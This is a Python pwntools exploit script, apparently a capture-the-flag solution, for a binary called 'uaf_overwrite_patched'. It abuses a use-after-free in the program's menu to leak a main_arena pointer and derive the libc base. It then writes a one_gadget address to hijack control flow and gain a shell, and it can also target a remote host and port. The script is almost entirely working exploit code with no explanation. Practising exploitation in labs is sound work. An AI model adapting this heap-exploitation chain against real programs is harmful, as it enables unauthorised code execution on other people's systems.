from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './uaf_overwrite_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = elf.libc
sla = p.sendlineafter
sa = p.sendafter
def human(weight, age):
    sla(b'> ', b'1')
    sla(b'Human Weight: ', str(weight).encode())
    sla(b'Human Age: ', str(age).encode())

def robot(weight):
    sla(b'> ', b'2')
    sla(b'Robot Weight: ', str(weight).encode())

def custom(size, data, idx):
    sla(b'> ', b'3')
    sla(b'Size: ', str(size).encode())
    if size >= 0x100:
        sa(b'Data: ', data)
        p.recvuntil(b'Data: ')
        data = p.recvline()[:-1]
        sla(b'Free idx: ', str(idx).encode())
        return data

custom(0x500, b'a', 1)
robot(1)  # prevent coalescence
custom(0x100, b'a', 0)
leak = custom(0x500, b'a' * 8, 0)
main_arena = u64(leak[8:].ljust(8,b'\x00')) - 96
log.info('main_arena: ' + hex(main_arena))
libc.address = main_arena - libc.symbols['__malloc_hook'] - 0x10
one_gadget = libc.address + 0x10a41c
human(100, one_gadget)
robot(1)
p.interactive()